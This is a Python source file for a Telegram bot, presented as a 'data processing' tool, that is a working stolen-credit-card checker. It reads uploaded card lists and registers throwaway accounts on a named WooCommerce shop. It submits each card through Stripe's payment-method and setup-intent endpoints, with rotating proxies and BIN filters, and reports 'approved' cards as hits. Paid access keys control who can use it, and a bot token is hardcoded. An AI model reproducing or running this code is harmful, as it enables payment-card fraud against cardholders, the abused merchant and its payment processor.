# ============================================================
#  Telegram Bot — Data Processing Interface
#  Made by TalkNeon
# ============================================================

import os
import re
import time
import random
import json
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from typing import Dict, Any, Optional
from datetime import datetime

try:
    from faker import Faker
    faker = Faker()
except ImportError:
    faker = None

# ============================================================
#  Configuration
# ============================================================
BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
DEVELOPER = "TalkNeon"
ADMIN_IDS = [5342093297]

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")
STATS_FILE = os.path.join(DATA_DIR, "tg_stats.json")
PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
#  Persistence — Keys, Users, Stats
# ============================================================
def _load_json(path, default=None):
    if default is None:
        default = {}
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_keys():
    return _load_json(KEYS_FILE, {})


def save_keys(data):
    _save_json(KEYS_FILE, data)


def load_users():
    return _load_json(USERS_FILE, {})


def save_users(data):
    _save_json(USERS_FILE, data)


def load_stats():
    return _load_json(STATS_FILE, {})


def save_stats(data):
    _save_json(STATS_FILE, data)


def update_user_stats(user_id, results):
    stats = load_stats()
    uid = str(user_id)
    if uid not in stats:
        stats[uid] = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": 0, "sessions": 0}
    stats[uid]["approved"] += results.get("approved", 0)
    stats[uid]["declined"] += results.get("declined", 0)
    stats[uid]["errors"] += results.get("errors", 0)
    stats[uid]["skipped"] += results.get("skipped", 0)
    stats[uid]["total"] += results.get("total", 0)
    stats[uid]["sessions"] += 1
    save_stats(stats)


# ============================================================
#  Duration parsing (for time-limited keys)
# ============================================================
DURATION_MAP = {
    "s": 1, "sec": 1,
    "m": 60, "min": 60,
    "h": 3600, "hr": 3600, "hour": 3600,
    "d": 86400, "day": 86400,
    "w": 604800, "week": 604800,
    "mo": 2592000, "month": 2592000,
}


def parse_duration(s):
    if not s:
        return None
    s = s.strip().lower()
    if s in ("forever", "perm", "permanent"):
        return None
    match = re.match(r'^(\d+)\s*(s|sec|m|min|h|hr|hour|d|day|w|week|mo|month)s?$', s)
    if not match:
        return -1
    n = int(match.group(1))
    unit = match.group(2)
    mult = DURATION_MAP.get(unit)
    if not mult:
        return -1
    return n * mult


def fmt_duration(seconds):
    if seconds is None:
        return "Permanent"
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m"
    if seconds < 86400:
        return f"{seconds // 3600}h"
    return f"{seconds // 86400}d"


def generate_key():
    return "TN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))


def is_admin(user_id):
    return int(user_id) in ADMIN_IDS


def is_authorized(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del users[str(user_id)]
    save_users(users)
    return False


def authorize_user(user_id, key, duration_seconds=None):
    users = load_users()
    entry = {"key": key, "redeemed_at": time.time()}
    if duration_seconds is not None:
        entry["expires_at"] = time.time() + duration_seconds
    else:
        entry["expires_at"] = None
    users[str(user_id)] = entry
    save_users(users)


# ============================================================
#  Telegram API helpers
# ============================================================
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg_request(method, **kwargs):
    try:
        r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30)
        return r.json()
    except Exception:
        return {}


def send_message(chat_id, text, parse_mode="HTML", reply_to=None, reply_markup=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("sendMessage", **params)


def edit_message(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    params = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("editMessageText", **params)


def answer_callback(callback_id, text=""):
    return tg_request("answerCallbackQuery", callback_query_id=callback_id, text=text)


def get_file_url(file_id):
    resp = tg_request("getFile", file_id=file_id)
    if resp.get("ok"):
        path = resp["result"]["file_path"]
        return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    return None


def download_file(file_id):
    url = get_file_url(file_id)
    if not url:
        return None
    try:
        r = requests.get(url, timeout=30)
        return r.text
    except Exception:
        return None


# ============================================================
#  Processing engine — ported from ehhhh.py (UNCHANGED LOGIC)
# ============================================================
def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None,
    proxies: Optional[Dict[str, str]] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value

    if data is None: data = {}
    if params is None: params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower(): params[key] = value
            else: data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'proxies': proxies,
        'timeout': 20
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    response = req_session.request(method, **request_kwargs)
    return response


def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']

        def find_msg(obj):
            if isinstance(obj, dict):
                if 'message' in obj: return obj['message']
                for v in obj.values():
                    res = find_msg(v)
                    if res: return res
            return None

        res_msg = find_msg(response_json)
        if res_msg: return res_msg

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"
    except:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:100]}..."


def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    try:
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {'User-Agent': user_ag}
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)

        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        pk_match = re.search('"key":"(.*?)"', response_1.text)
        if not reg_match or not pk_match: return "Failed to extract session tokens"

        regester_nouce = reg_match.group(1)
        pk = pk_match.group(1)

        if faker:
            email = faker.email()
        else:
            email = f"user{random.randint(1000,9999)}@gmail.com"

        data_2 = {
            'email': email,
            'woocommerce-register-nonce': regester_nouce,
            'register': 'Register',
        }
        response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)

        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)
        if not nonce_match: return "Failed to extract ajax nonce"
        ajax_nonce = nonce_match.group(1)

        url_3 = 'https://api.stripe.com/v1/payment_methods'
        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': client_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
            '_stripe_version': '2024-06-20',
        }
        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)

        if response_3.status_code != 200: return f"Stripe Error: {extract_message(response_3)}"
        pm = response_3.json().get('id')

        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)

        msg = extract_message(response_4)
        status = "Approved" if response_4.json().get("success") else "Declined"
        return f"{status} | {msg}"
    except Exception as e:
        return f"Error: {str(e)}"


def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
    return None


def process_single_entry(entry, proxies_list, user_id):
    raw_proxy = random.choice(proxies_list) if proxies_list else None
    proxy_dict = format_proxy(raw_proxy)

    try:
        c_data = entry.split('|')

        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data

            # BIN FILTER
            user_bin_list = user_bins.get(user_id)
            if user_bin_list:
                if not any(c_num.startswith(b) for b in user_bin_list):
                    return "SKIPPED | BIN not allowed"

            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
        else:
            result = "Error: Invalid Format"

    except Exception as e:
        result = f"Error: {str(e)}"

    return result


# ============================================================
#  Processing runner with multi-threading + rate-limited progress
# ============================================================
DEFAULT_THREADS = 3


def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS):
    proxies_list = []
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]

    total = len(lines)
    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
    results_lock = threading.Lock()
    processed = [0]

    def worker(entry):
        if cancel_flags.get(user_id):
            return None

        entry = entry.strip()
        if not entry:
            return ("", "INVALID", "Empty line", "error")

        result = process_single_entry(entry, proxies_list, user_id)

        if "SKIPPED" in result:
            category = "skipped"
            status = "SKIPPED"
        elif "Approved" in result:
            category = "approved"
            status = "APPROVED"
        elif "Declined" in result:
            category = "declined"
            status = "DECLINED"
        else:
            category = "error"
            status = "ERROR"

        detail = result.split(" | ", 1)[1] if " | " in result else result
        return (entry, status, detail, category)

    max_workers = max(1, min(threads, total, 10))

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}

        for fut in as_completed(futures):
            if cancel_flags.get(user_id):
                break

            result = fut.result()
            if result is None:
                continue

            entry, status, detail, category = result

            with results_lock:
                if category == "approved":
                    results["approved"] += 1
                    results["approved_list"].append(entry)
                elif category == "declined":
                    results["declined"] += 1
                elif category == "skipped":
                    results["skipped"] += 1
                else:
                    results["errors"] += 1

                processed[0] += 1
                idx = processed[0]

            if on_progress:
                on_progress(idx, total, results, entry, status, detail)

    if on_complete:
        on_complete(results)

    return results


# ============================================================
#  Bot message formatters
# ============================================================
FOOTER = f"\n{'─' * 28}\n  Made by {DEVELOPER}"


def fmt_start():
    return (
        "<b>Data Processing Bot</b>\n"
        f"{'─' * 28}\n\n"
        "Upload a <b>.txt</b> file, then reply to it with <b>/run</b>\n\n"
        "<b>Commands:</b>\n"
        "  /start      — Show this menu\n"
        "  /redeem     — Unlock access\n"
        "  /run        — Process uploaded file\n"
        "  /bin        — Set BIN filter\n"
        "  /clearbin   — Clear BIN filter\n"
        "  /cancel     — Stop active task\n"
        "  /stats      — Your lifetime stats\n"
        "  /mykey      — Check your key info\n"
        "  /proxies    — Upload proxy file\n"
        "  /lookup     — Lookup (coming soon)\n\n"
        "<b>How to use:</b>\n"
        "  1. Send a .txt file\n"
        "  2. Reply to the file with /run\n"
        "  3. Wait for results\n"
        f"{FOOTER}"
    )


def fmt_unauthorized():
    return (
        "<b>Access Denied</b>\n\n"
        "You need to redeem a key first.\n"
        "Use: <code>/redeem YOUR-KEY</code>\n"
        f"{FOOTER}"
    )


def fmt_live(idx, total, results, start_time, entry="", status_text="", done=False):
    title = "Engine Complete" if done else "Engine Active"

    elapsed = time.time() - start_time
    cpm = int((idx / elapsed) * 60) if elapsed > 0 else 0
    eta = int((total - idx) / (idx / elapsed)) if idx > 0 and elapsed > 0 else 0

    bar_len = 16
    filled = int(bar_len * idx / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    pct = int(idx / total * 100) if total > 0 else 0

    return (
        f"<b>{title}</b>\n\n"
        f"<code>{bar}</code> {pct}%\n\n"
        f"Loaded: <code>{total}</code>\n"
        f"Progress: <code>{idx}/{total}</code>\n"
        f"Speed: <code>{cpm} CPM</code>\n"
        f"ETA: <code>{eta}s</code>\n\n"
        f"Current:\n<code>{entry}</code>\n\n"
        f"Status:\n{status_text}\n\n"
        f"Valid: <code>{results['approved']}</code>\n"
        f"Dead: <code>{results['declined']}</code>\n"
        f"Skipped: <code>{results['skipped']}</code>\n"
        f"Issues: <code>{results['errors']}</code>\n"
    )


def fmt_results(results):
    return (
        "<b>Session Complete</b>\n\n"
        f"Total: {results['total']}\n"
        f"Approved: {results['approved']}\n"
        f"Declined: {results['declined']}\n"
        f"Skipped: {results['skipped']}\n"
        f"Errors: {results['errors']}\n"
        + FOOTER
    )


def fmt_stats(user_id):
    stats = load_stats()
    uid = str(user_id)
    s = stats.get(uid)
    if not s:
        return f"<b>No Stats</b>\n\nYou haven't run any sessions yet.{FOOTER}"

    return (
        "<b>Your Lifetime Stats</b>\n"
        f"{'─' * 28}\n\n"
        f"Sessions: <code>{s.get('sessions', 0)}</code>\n"
        f"Total Processed: <code>{s.get('total', 0)}</code>\n"
        f"Approved: <code>{s.get('approved', 0)}</code>\n"
        f"Declined: <code>{s.get('declined', 0)}</code>\n"
        f"Skipped: <code>{s.get('skipped', 0)}</code>\n"
        f"Errors: <code>{s.get('errors', 0)}</code>\n"
        + FOOTER
    )


def fmt_mykey(user_id):
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return f"<b>No Key</b>\n\nYou haven't redeemed a key.{FOOTER}"

    key = entry.get("key", "N/A")
    redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
    expires_at = entry.get("expires_at")
    if expires_at is None:
        exp_text = "Never (Permanent)"
    else:
        exp_text = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M UTC")
        if time.time() > expires_at:
            exp_text += " (EXPIRED)"

    return (
        "<b>Your Key Info</b>\n"
        f"{'─' * 28}\n\n"
        f"Key: <code>{key}</code>\n"
        f"Redeemed: <code>{redeemed}</code>\n"
        f"Expires: <code>{exp_text}</code>\n"
        + FOOTER
    )


# ============================================================
#  Inline keyboard helpers
# ============================================================
def stop_button_markup(user_id):
    return {
        "inline_keyboard": [[
            {"text": "Stop", "callback_data": f"stop_{user_id}"}
        ]]
    }


# ============================================================
#  Active processing tracker (one per user)
# ============================================================
active_users = set()
user_bins = {}
active_lock = threading.Lock()
cancel_flags = {}


# ============================================================
#  Command handlers
# ============================================================
def handle_callback(update):
    cb = update.get("callback_query")
    if not cb:
        return

    data = cb.get("data", "")
    cb_user_id = cb["from"]["id"]
    cb_id = cb["id"]

    if data.startswith("stop_"):
        target_uid = int(data.split("_", 1)[1])
        if cb_user_id == target_uid or is_admin(cb_user_id):
            cancel_flags[target_uid] = True
            answer_callback(cb_id, "Stopping task...")
        else:
            answer_callback(cb_id, "Not your task.")


def handle_update(update):
    if "callback_query" in update:
        handle_callback(update)
        return

    msg = update.get("message")
    if not msg:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text = (msg.get("text") or "").strip()

    # --- /bin ---
    if text.startswith("/bin"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> /bin 424242,555555" + FOOTER)
            return
        bins = parts[1].replace(" ", "").split(",")
        user_bins[user_id] = bins
        send_message(chat_id, f"<b>BIN filter set:</b>\n<code>{', '.join(bins)}</code>" + FOOTER)
        return

    # --- /clearbin ---
    if text == "/clearbin":
        if user_id in user_bins:
            del user_bins[user_id]
            send_message(chat_id, "<b>BIN filter cleared.</b>" + FOOTER)
        else:
            send_message(chat_id, "<b>No BIN filter active.</b>" + FOOTER)
        return

    # --- /cancel ---
    if text == "/cancel":
        if user_id in active_users:
            cancel_flags[user_id] = True
            send_message(chat_id, "<b>Stopping your task...</b>" + FOOTER)
        else:
            send_message(chat_id, "<b>No active task.</b>" + FOOTER)
        return

    # --- /start ---
    if text == "/start":
        send_message(chat_id, fmt_start())
        return

    # --- /lookup ---
    if text == "/lookup":
        send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
        return

    # --- /stats ---
    if text == "/stats":
        send_message(chat_id, fmt_stats(user_id))
        return

    # --- /mykey ---
    if text == "/mykey":
        send_message(chat_id, fmt_mykey(user_id))
        return

    # --- /proxies (admin uploads proxy file) ---
    if text == "/proxies":
        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id, "<b>Reply to a .txt proxy file with /proxies</b>" + FOOTER)
            return
        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, "<b>Only .txt files accepted.</b>" + FOOTER)
            return
        if not is_admin(user_id):
            send_message(chat_id, "<b>Admin only.</b>" + FOOTER)
            return
        content = download_file(doc["file_id"])
        if not content:
            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
            return
        proxies = [l.strip() for l in content.splitlines() if l.strip()]
        with open(PROXIES_FILE, "w") as f:
            f.write("\n".join(proxies))
        send_message(chat_id, f"<b>Proxies Loaded</b>\n\n<code>{len(proxies)}</code> proxies saved." + FOOTER)
        return

    # --- /genkey (admin) with optional duration ---
    if text.startswith("/genkey"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return

        parts = text.split(maxsplit=1)
        duration_str = parts[1].strip() if len(parts) > 1 else None
        duration_seconds = None

        if duration_str:
            parsed = parse_duration(duration_str)
            if parsed == -1:
                send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm" + FOOTER)
                return
            duration_seconds = parsed

        key = generate_key()
        keys = load_keys()
        keys[key] = {
            "created_by": user_id,
            "created_at": time.time(),
            "used": False,
            "duration": duration_seconds,
        }
        save_keys(keys)

        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        send_message(chat_id, f"<b>Key Generated</b>\n\n<code>{key}</code>\nDuration: <code>{dur_label}</code>{FOOTER}")
        return

    # --- /broadcast (admin) ---
    if text.startswith("/broadcast"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> /broadcast Your message here" + FOOTER)
            return
        broadcast_text = parts[1]
        users = load_users()
        sent = 0
        failed = 0
        for uid in users:
            try:
                resp = send_message(int(uid), f"<b>Broadcast</b>\n\n{broadcast_text}{FOOTER}")
                if resp.get("ok"):
                    sent += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
        send_message(chat_id, f"<b>Broadcast Complete</b>\n\nSent: <code>{sent}</code>\nFailed: <code>{failed}</code>{FOOTER}")
        return

    # --- /redeem ---
    if text.startswith("/redeem"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/redeem YOUR-KEY</code>" + FOOTER)
            return
        key = parts[1].strip()
        keys = load_keys()
        if key not in keys:
            send_message(chat_id, "<b>Invalid key.</b>" + FOOTER)
            return
        if keys[key].get("used"):
            send_message(chat_id, "<b>Key already used.</b>" + FOOTER)
            return
        keys[key]["used"] = True
        keys[key]["used_by"] = user_id
        save_keys(keys)

        duration_seconds = keys[key].get("duration")
        authorize_user(user_id, key, duration_seconds)

        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        send_message(chat_id, f"<b>Access Granted</b>\n\nDuration: <code>{dur_label}</code>\nWelcome aboard.{FOOTER}")
        return

    # --- /run ---
    if text == "/run":
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id, "<b>Reply to a .txt file with /run</b>" + FOOTER)
            return

        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, "<b>Only .txt files are accepted.</b>" + FOOTER)
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, "<b>You already have a task running.</b>" + FOOTER)
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        content = download_file(doc["file_id"])
        if not content:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
            return

        lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not lines:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
            return

        init_resp = send_message(
            chat_id,
            "Starting Engine...",
            reply_markup=stop_button_markup(user_id)
        )
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run():
            start_time = time.time()
            last_edit_time = [0]

            def on_progress(idx, total, results, entry, status, detail):
                if status == "APPROVED":
                    status_text = "APPROVED — " + detail
                elif status == "DECLINED":
                    status_text = "DECLINED — " + detail
                elif status == "SKIPPED":
                    status_text = "SKIPPED — " + detail
                else:
                    status_text = "ERROR — " + detail

                # Instant hit notification — send immediately on approval
                if status == "APPROVED":
                    send_message(
                        chat_id,
                        f"<b>HIT FOUND</b>\n"
                        f"{'─' * 28}\n\n"
                        f"<code>{entry}</code>\n\n"
                        f"{detail}\n"
                        f"{'─' * 28}\n"
                        f"  [{idx}/{total}]"
                    )

                now = time.time()
                if progress_msg_id and (now - last_edit_time[0] >= 3 or idx == total):
                    last_edit_time[0] = now
                    markup = None if idx == total else stop_button_markup(user_id)
                    edit_message(
                        chat_id,
                        progress_msg_id,
                        fmt_live(idx, total, results, start_time, entry=entry, status_text=status_text, done=(idx == total)),
                        reply_markup=markup
                    )

            def on_complete(results):
                cancel_flags.pop(user_id, None)
                update_user_stats(user_id, results)

                if progress_msg_id:
                    edit_message(
                        chat_id,
                        progress_msg_id,
                        fmt_live(
                            results['total'], results['total'], results, start_time,
                            entry="Finished", status_text="Completed", done=True
                        )
                    )

                send_message(chat_id, fmt_results(results))

                if results["approved_list"]:
                    filename = f"approved_{int(time.time())}.txt"
                    filepath = os.path.join(DATA_DIR, filename)
                    with open(filepath, "w") as f:
                        for entry in results["approved_list"]:
                            f.write(entry + "\n")
                    with open(filepath, "rb") as f:
                        requests.post(
                            f"{API_BASE}/sendDocument",
                            data={"chat_id": chat_id},
                            files={"document": f}
                        )

                with active_lock:
                    active_users.discard(user_id)

            run_processing(lines, user_id, on_progress=on_progress, on_complete=on_complete)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return


# ============================================================
#  Polling loop
# ============================================================
def main():
    print(f"[Bot] Starting — Made by {DEVELOPER}")
    print(f"[Bot] Polling for updates...")

    offset = 0
    while True:
        try:
            resp = tg_request("getUpdates", offset=offset, timeout=30)
            updates = resp.get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print(f"[Bot] Error handling update: {e}")
        except KeyboardInterrupt:
            print("\n[Bot] Stopped.")
            break
        except Exception as e:
            print(f"[Bot] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
